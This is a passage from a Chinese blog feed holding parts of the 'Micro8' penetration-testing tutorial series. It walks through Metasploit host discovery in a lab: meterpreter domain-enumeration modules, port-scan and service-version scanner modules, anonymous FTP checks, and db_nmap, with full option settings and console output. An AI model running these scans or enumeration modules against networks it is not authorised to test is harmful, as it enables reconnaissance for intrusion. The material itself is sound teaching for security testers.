src="../do/media/388af809ba44b622b6a64de97dd44fbc.jpg" alt></p><h3 id="二十七：基于windows-gather-enum-computers发现域中存活主机"><a href="#二十七：基于windows-gather-enum-computers发现域中存活主机" class="headerlink" title="二十七：基于windows/gather/enum_computers发现域中存活主机"></a>二十七：基于windows/gather/enum_computers发现域中存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run windows/gather/enum_computers </span><br><span class="line"></span><br><span class="line">[*] Running module against VM_2003X86</span><br><span class="line">[‐] This host is not part of a domain.</span><br></pre></td></tr></table></figure><p><img src="../do/media/464039145a91d47df09c1e64b4155a8b.jpg" alt></p><h3 id="二十八：基于windows-gather-enum-domain发现域中存活主机"><a href="#二十八：基于windows-gather-enum-domain发现域中存活主机" class="headerlink" title="二十八：基于windows/gather/enum_domain发现域中存活主机"></a>二十八：基于windows/gather/enum_domain发现域中存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run windows/gather/enum_domain</span><br></pre></td></tr></table></figure><p><img src="../do/media/55a665ab66de46215d6f6f7c2c4f35b9.jpg" alt></p><h3 id="二十九：基于windows-gather-enum-domains-发现域中存活主机"><a href="#二十九：基于windows-gather-enum-domains-发现域中存活主机" class="headerlink" title="二十九：基于windows/gather/enum_domains 发现域中存活主机"></a>二十九：基于windows/gather/enum_domains 发现域中存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run windows/gather/enum_domains </span><br><span class="line"></span><br><span class="line">[*] Enumerating DCs for WORKGROUP</span><br><span class="line">[‐] No Domain Controllers found...</span><br></pre></td></tr></table></figure><p><img src="../do/media/2169c37a25c37ef453d7c14a9b1d865a.jpg" alt></p><h3 id="三十：基于windows-gather-enum-ad-user-comments发现域中存活主机"><a href="#三十：基于windows-gather-enum-ad-user-comments发现域中存活主机" class="headerlink" title="三十：基于windows/gather/enum_ad_user_comments发现域中存活主机"></a>三十：基于windows/gather/enum_ad_user_comments发现域中存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run windows/gather/enum_ad_user_comments</span><br></pre></td></tr></table></figure><p><img src="../do/media/daedf801fde98f563d15553d382f81bd.jpg" alt></p><p><strong>POST下相关模块如：（列举）不一一介绍</strong></p><ul><li>linux/gather/enum_network</li><li>linux/busybox/enum_hosts</li><li>windows/gather/enum_ad_users</li><li>windows/gather/enum_domain_tokens</li><li>windows/gather/enum_snmp</li></ul><p>至此，MSF发现内网存活主机主要模块介绍与使用完毕。</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>27、基于MSF发现内网存活主机第五季</title>
      <link href="/article/27_%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E4%BA%94%E5%AD%A3.html"/>
      <url>/article/27_%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E4%BA%94%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。<br>痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。</p><p><strong>攻击机：</strong><br>192.168.1.102 Debian<br><strong>靶机：</strong><br>192.168.1.2 Windows 7<br>192.168.1.115 Windows 2003<br>192.168.1.119 Windows 2003</p><p><strong>第一季主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/discovery/arp_sweep </li><li>auxiliary/scanner/discovery/udp_sweep</li><li>auxiliary/scanner/ftp/ftp_version </li><li>auxiliary/scanner/http/http_version</li><li>auxiliary/scanner/smb/smb_version</li></ul><p><strong>第二季主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/ssh/ssh_version </li><li>auxiliary/scanner/telnet/telnet_version</li><li>auxiliary/scanner/discovery/udp_probe </li><li>auxiliary/scanner/dns/dns_amp</li><li>auxiliary/scanner/mysql/mysql_version</li></ul><p><strong>第三季主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/netbios/nbname </li><li>auxiliary/scanner/http/title</li><li>auxiliary/scanner/db2/db2_version </li><li>auxiliary/scanner/portscan/ack</li><li>auxiliary/scanner/portscan/tcp</li></ul><p><strong>第四季主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/portscan/syn </li><li>auxiliary/scanner/portscan/ftpbounce</li><li>auxiliary/scanner/portscan/xmas </li><li>auxiliary/scanner/rdp/rdp_scanner</li><li>auxiliary/scanner/smtp/smtp_version</li></ul><p><strong>第五季主要介绍scanner下的三个模块，以及db_nmap辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/pop3/pop3_version</li><li>auxiliary/scanner/postgres/postgres_version </li><li>auxiliary/scanner/ftp/anonymous</li><li>db_nmap</li></ul><h3 id="二十一：基于auxiliary-scanner-pop3-pop3-version发现内网存活主机"><a href="#二十一：基于auxiliary-scanner-pop3-pop3-version发现内网存活主机" class="headerlink" title="二十一：基于auxiliary/scanner/pop3/pop3_version发现内网存活主机"></a>二十一：基于auxiliary/scanner/pop3/pop3_version发现内网存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/pop3/pop3_version) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/pop3/pop3_version): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">RHOSTS 192.168.1.110‐120 yes The target address range or CIDR identifier</span><br><span class="line">RPORT 110 yes The target port (TCP)</span><br><span class="line">THREADS 50 yes The number of concurrent threads </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/pop3/pop3_version) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Scanned 5 of 11 hosts (45% complete)</span><br><span class="line">[*] Scanned 11 of 11 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/2582b5c030654781feac30f20350a575.jpg" alt></p><h3 id="二十二：基于auxiliary-scanner-postgres-postgres-version发现内网存活主机"><a href="#二十二：基于auxiliary-scanner-postgres-postgres-version发现内网存活主机" class="headerlink" title="二十二：基于auxiliary/scanner/postgres/postgres_version发现内网存活主机"></a>二十二：基于auxiliary/scanner/postgres/postgres_version发现内网存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/postgres/postgres_version) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/postgres/postgres_version): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">DATABASE template1 yes The database to authenticate against</span><br><span class="line">PASSWORD msf no The password for the specified username. Leave blank for a random password.</span><br><span class="line">RHOSTS 127.0.0.1 yes The target address range or CIDR identifier</span><br><span class="line">RPORT 5432 yes The target port</span><br><span class="line">THREADS 50 yes The number of concurrent threads</span><br><span class="line">USERNAME msf yes The username to authenticate as</span><br><span class="line">VERBOSE false no Enable verbose output </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/postgres/postgres_version) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] 127.0.0.1:5432 Postgres ‐ Version PostgreSQL 9.6.6 on x86_64‐pc‐li</span><br><span class="line">nux‐gnu, compiled by gcc (Debian 4.9.2‐10) 4.9.2, 64‐bit (Post‐Auth)</span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/03f13e7247773b96df39085bc75361f6.jpg" alt></p><h3 id="二十三：基于auxiliary-scanner-ftp-anonymous发现内网存活主机"><a href="#二十三：基于auxiliary-scanner-ftp-anonymous发现内网存活主机" class="headerlink" title="二十三：基于auxiliary/scanner/ftp/anonymous发现内网存活主机"></a>二十三：基于auxiliary/scanner/ftp/anonymous发现内网存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/ftp/anonymous) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ftp/anonymous): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">FTPPASS mozilla@example.com no The password for the specified username</span><br><span class="line">FTPUSER anonymous no The username to authenticate as</span><br><span class="line">RHOSTS 192.168.1.100‐120 yes The target address range or CIDR identifier</span><br><span class="line">RPORT 21 yes The target port (TCP)</span><br><span class="line">THREADS 50 yes The number of concurrent threads </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/ftp/anonymous) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.1.115:21 ‐ 192.168.1.115:21 ‐ Anonymous READ (220 Slyar Ftpserver)</span><br><span class="line">[+] 192.168.1.119:21 ‐ 192.168.1.119:21 ‐ Anonymous READ (220 FTPserver)</span><br><span class="line">[*] Scanned 3 of 21 hosts (14% complete)</span><br><span class="line">[*] Scanned 6 of 21 hosts (28% complete)</span><br><span class="line">[*] Scanned 17 of 21 hosts (80% complete)</span><br><span class="line">[*] Scanned 21 of 21 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/51df07fdc37e6804845d3560e50e76d6.jpg" alt></p><h3 id="二十四：基于db-nmap发现内网存活主机"><a href="#二十四：基于db-nmap发现内网存活主机" class="headerlink" title="二十四：基于db_nmap发现内网存活主机"></a>二十四：基于db_nmap发现内网存活主机</h3><p>MSF内置强大的端口扫描工具Nmap，为了更好的区别，内置命令为：db_nmap，并且会自动存储nmap扫描结果到数据库中，方便快速查询已知存活主机，以及更快捷的进行团队协同作战，使用方法与nmap一致。也是在实战中最常用到的发现内网存活主机方式之一。</p><p>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; db_nmap ‐p 445 ‐T4 ‐sT 192.168.1.115‐120</span><br><span class="line">‐‐open</span><br><span class="line">[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019‐02‐17 15:17 EST</span><br><span class="line">[*] Nmap: Nmap scan report for 192.168.1.115</span><br><span class="line">[*] Nmap: Host is up (0.0025s latency).</span><br><span class="line">[*] Nmap: PORT STATE SERVICE</span><br><span class="line">[*] Nmap: 445/tcp open microsoft‐ds</span><br><span class="line">[*] Nmap: MAC Address: 00:0C:29:AF:CE:CC (VMware)</span><br><span class="line">[*] Nmap: Nmap scan report for 192.168.1.119</span><br><span class="line">[*] Nmap: Host is up (0.0026s latency).</span><br><span class="line">[*] Nmap: PORT STATE SERVICE</span><br><span class="line">[*] Nmap: 445/tcp open microsoft‐ds</span><br><span class="line">[*] Nmap: MAC Address: 00:0C:29:85:D6:7D (VMware)</span><br><span class="line">[*] Nmap: Nmap done: 6 IP addresses (2 hosts up) scanned in 13.35 seconds</span><br></pre></td></tr></table></figure><p><img src="../do/media/f6a61ed6bd0488434b4fc561063c0955.jpg" alt></p><p>命令hosts查看数据库中已发现的内网存活主机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; hosts </span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">===== </span><br><span class="line"></span><br><span class="line">address mac name os_name os_flavor os_sp purpose info comments</span><br><span class="line">‐‐‐‐‐‐‐ ‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐ ‐‐‐‐‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐‐</span><br><span class="line">1.34.37.188 firewall</span><br><span class="line">10.0.0.2 00:24:1d:dc:3b:16</span><br><span class="line">10.0.0.3 00:e0:81:bf:b9:7b</span><br><span class="line">10.0.0.4 00:30:6e:ca:10:b8</span><br><span class="line">10.0.0.5 9c:8e:99:c4:63:74 2013XXXXX Windows 2008 SP1 client</span><br><span class="line">...</span><br><span class="line">10.0.0.242 00:13:57:01:d4:71</span><br><span class="line">10.0.0.243 00:13:57:01:d4:73</span><br><span class="line">....</span><br><span class="line">10.162.110.30 firewall</span><br><span class="line">59.125.110.178 firewall</span><br><span class="line">127.0.0.1 Unknown device</span><br><span class="line">172.16.204.8 WIN‐6FEAACQJ691 Windows 2012 server</span><br><span class="line">172.16.204.9 WIN‐6FEAACQJ691 Windows 2012 server</span><br><span class="line">172.16.204.21 IDS Windows 2003 SP2 server</span><br><span class="line">192.168.1.5 JOHN‐PC Windows 7 SP1 client</span><br><span class="line">192.168.1.101 JOHN‐PC Windows 7 Ultimate SP1 client</span><br><span class="line">192.168.1.103 LAPTOP‐9994K8RP Windows 10 client</span><br><span class="line">192.168.1.115 00:0c:29:af:ce:cc VM_2003X86 Windows 2003 SP2 server</span><br><span class="line">192.168.1.116 WIN‐S4H51RDJQ3M Windows 2012 server</span><br><span class="line">192.168.1.119 00:0c:29:85:d6:7d WIN03X64 Windows 2003 SP2 server</span><br><span class="line">192.168.1.254 Unknown device</span><br><span class="line">192.168.50.30 WINDOWS‐G4MMTV8 Windows 7 SP1 client</span><br><span class="line">192.168.100.2 Unknown device</span><br><span class="line">192.168.100.10</span><br></pre></td></tr></table></figure><p>同样hosts命令也支持数据库中查询与搜索，方便快速对应目标存活主机。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; hosts ‐h</span><br><span class="line">Usage: hosts [ options ] [addr1 addr2 ...] </span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">‐a,‐‐add Add the hosts instead of searching</span><br><span class="line">‐d,‐‐delete Delete the hosts instead of searching</span><br><span class="line">‐c &lt;col1,col2&gt; Only show the given columns (see list below)</span><br><span class="line">‐C &lt;col1,col2&gt; Only show the given columns until the next restart (see list below)</span><br><span class="line">‐h,‐‐help Show this help information</span><br><span class="line">‐u,‐‐up Only show hosts which are up</span><br><span class="line">‐o &lt;file&gt; Send output to a file in csv format</span><br><span class="line">‐O &lt;column&gt; Order rows by specified column number</span><br><span class="line">‐R,‐‐rhosts Set RHOSTS from the results of the search</span><br><span class="line">‐S,‐‐search Search string to filter by</span><br><span class="line">‐i,‐‐info Change the info of a host</span><br><span class="line">‐n,‐‐name Change the name of a host</span><br><span class="line">‐m,‐‐comment Change the comment of a host</span><br><span class="line">‐t,‐‐tag Add or specify a tag to a range of hosts</span><br></pre></td></tr></table></figure><p><img src="../do/media/6c912e4d3e70d5562a87b3d5b5fa20ab.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; hosts ‐S 192 </span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">===== </span><br><span class="line"></span><br><span class="line">address mac name os_name os_flavor os_sp purpose info comments</span><br><span class="line">‐‐‐‐‐‐‐ ‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐ ‐‐‐‐‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐‐</span><br><span class="line">192.168.1.5 JOHN‐PC Windows 7 SP1 client</span><br><span class="line">192.168.1.101 JOHN‐PC Windows 7 Ultimate SP1 client</span><br><span class="line">192.168.1.103 LAPTOP‐9994K8RP Windows 10 client</span><br><span class="line">192.168.1.115 00:0c:29:af:ce:cc VM_2003X86 Windows 2003 SP2 server</span><br><span class="line">192.168.1.116 WIN‐S4H51RDJQ3M Windows 2012 server</span><br><span class="line">192.168.1.119 00:0c:29:85:d6:7d WIN03X64 Windows 2003 SP2 server</span><br><span class="line">192.168.1.254 Unknown device</span><br><span class="line">192.168.50.30 WINDOWS‐G4MMTV8 Windows 7 SP1 client</span><br><span class="line">192.168.100.2 Unknown device</span><br><span class="line">192.168.100.10</span><br></pre></td></tr></table></figure><p><img src="../do/media/4de3270d16aaa2d24dd912d7dda76647.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>26、基于MSF发现内网存活主机第四季</title>
      <link href="/article/26_%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E5%9B%9B%E5%AD%A3.html"/>
      <url>/article/26_%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E5%9B%9B%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。<br>痛风可伴发肥胖症、高血压病、糖尿病、脂代谢紊乱等多种代谢性疾病。</p><p><strong>攻击机：</strong><br>192.168.1.5 Debian</p><p><strong>靶机：</strong><br>192.168.1.2 Windows 7<br>192.168.1.115 Windows 2003<br>192.168.1.119 Windows 2003</p><p><strong>第一季主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/discovery/arp_sweep </li><li>auxiliary/scanner/discovery/udp_sweep</li><li>auxiliary/scanner/ftp/ftp_version </li><li>auxiliary/scanner/http/http_version</li><li>auxiliary/scanner/smb/smb_version</li></ul><p><strong>第二季主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/ssh/ssh_version </li><li>auxiliary/scanner/telnet/telnet_version</li><li>auxiliary/scanner/discovery/udp_probe</li><li>auxiliary/scanner/dns/dns_amp</li><li>auxiliary/scanner/mysql/mysql_version</li></ul><p><strong>第三季主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/netbios/nbname </li><li>auxiliary/scanner/http/title</li><li>auxiliary/scanner/db2/db2_version </li><li>auxiliary/scanner/portscan/ack</li><li>auxiliary/scanner/portscan/tcp</li></ul><p><strong>第四季主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/portscan/syn </li><li>auxiliary/scanner/portscan/ftpbounce</li><li>auxiliary/scanner/portscan/xmas </li><li>auxiliary/scanner/rdp/rdp_scanner</li><li>auxiliary/scanner/smtp/smtp_version</li></ul><h3 id="十六：基于auxiliary-scanner-portscan-syn发现内网存活主机"><a href="#十六：基于auxiliary-scanner-portscan-syn发现内网存活主机" class="headerlink" title="十六：基于auxiliary/scanner/portscan/syn发现内网存活主机"></a>十六：基于auxiliary/scanner/portscan/syn发现内网存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/portscan/syn) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/portscan/syn): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">BATCHSIZE 256 yes The number of hosts to scan per set</span><br><span class="line">DELAY 0 yes The delay between connections, per thread, in millisecond s</span><br><span class="line">INTERFACE no The name of the interface</span><br><span class="line">JITTER 0 yes The delay jitter factor (maximum value by which to +/‐ DELAY) in milliseconds.</span><br><span class="line">PORTS 445 yes Ports to scan (e.g. 22‐25,80,110‐900)</span><br><span class="line">RHOSTS 192.168.1.115 yes The target address range or CIDR identifier</span><br><span class="line">SNAPLEN 65535 yes The number of bytes to capture</span><br><span class="line">THREADS 50 yes The number of concurrent threads</span><br><span class="line">TIMEOUT 500 yes The reply read timeout in milliseconds </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/portscan/syn) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] TCP OPEN 192.168.1.115:445</span><br><span class="line"></span><br><span class="line">[*] Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/6ce14da5f1aa14dad81aaf7cf11364d2.jpg" alt></p><h3 id="十七：基于auxiliary-scanner-portscan-ftpbounce发现内网存活主机"><a href="#十七：基于auxiliary-scanner-portscan-ftpbounce发现内网存活主机" class="headerlink" title="十七：基于auxiliary/scanner/portscan/ftpbounce发现内网存活主机"></a>十七：基于auxiliary/scanner/portscan/ftpbounce发现内网存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/portscan/ftpbounce) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/portscan/ftpbounce): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">BOUNCEHOST 192.168.1.119 yes FTP relay host</span><br><span class="line">BOUNCEPORT 21 yes FTP relay port</span><br><span class="line">DELAY 0 yes The delay between connections, per thread, in millisecond s</span><br><span class="line">FTPPASS mozilla@example.com no The password for the specified usernam e</span><br><span class="line">FTPUSER anonymous no The username to authenticate as</span><br><span class="line">JITTER 0 yes The delay jitter factor (maximum value by which to +/‐ DELAY) in milliseconds.</span><br><span class="line">PORTS 22‐25 yes Ports to scan (e.g. 22‐25,80,110‐900)</span><br><span class="line">RHOSTS 192.168.1.119 yes The target address range or CIDR identifier</span><br><span class="line">THREADS 50 yes The number of concurrent threads </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/portscan/ftpbounce) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.1.119:21 ‐ TCP OPEN 192.168.1.119:22</span><br><span class="line">[+] 192.168.1.119:21 ‐ TCP OPEN 192.168.1.119:23</span><br><span class="line">[+] 192.168.1.119:21 ‐ TCP OPEN 192.168.1.119:24</span><br><span class="line">[+] 192.168.1.119:21 ‐ TCP OPEN 192.168.1.119:25</span><br><span class="line">[*] 192.168.1.119:21 ‐ Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p><img src="../do/media/e68f4b46ae29ee41050a69a3a97020ab.jpg" alt></p><h3 id="十八：基于auxiliary-scanner-portscan-xmas发现内网存活主机"><a href="#十八：基于auxiliary-scanner-portscan-xmas发现内网存活主机" class="headerlink" title="十八：基于auxiliary/scanner/portscan/xmas发现内网存活主机"></a>十八：基于auxiliary/scanner/portscan/xmas发现内网存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(scanner/portscan/xmas) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/portscan/xmas): </span><br><span class="line"></span><br><span class="line">Name Current Setting Required Description</span><br><span class="line">‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">BATCHSIZE 256 yes The number of hosts to scan per set</span><br><span class="line">DELAY 0 yes The delay between connections, per thread, in millisecond s</span><br><span class="line">INTERFACE no The name of the interface</span><br><span class="line">JITTER 0 yes The delay jitter factor (maximum value by which to +/‐ DELAY) in milliseconds.</span><br><span class="line">PORTS 80 yes Ports to scan (e.g. 22‐25,80,110‐900)</span><br><span class="line">RHOSTS 192.168.1.119 yes The target address range or CIDR identifier</span><br><span class="line">SNAPLEN 65535 yes The number of bytes to capture</span><br><span class="line">THREADS 50 yes The number of concurrent threads</span><br><span class="line">TIMEOUT 500 yes The reply read timeout in milliseconds </span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner/portscan/xmas) &gt; 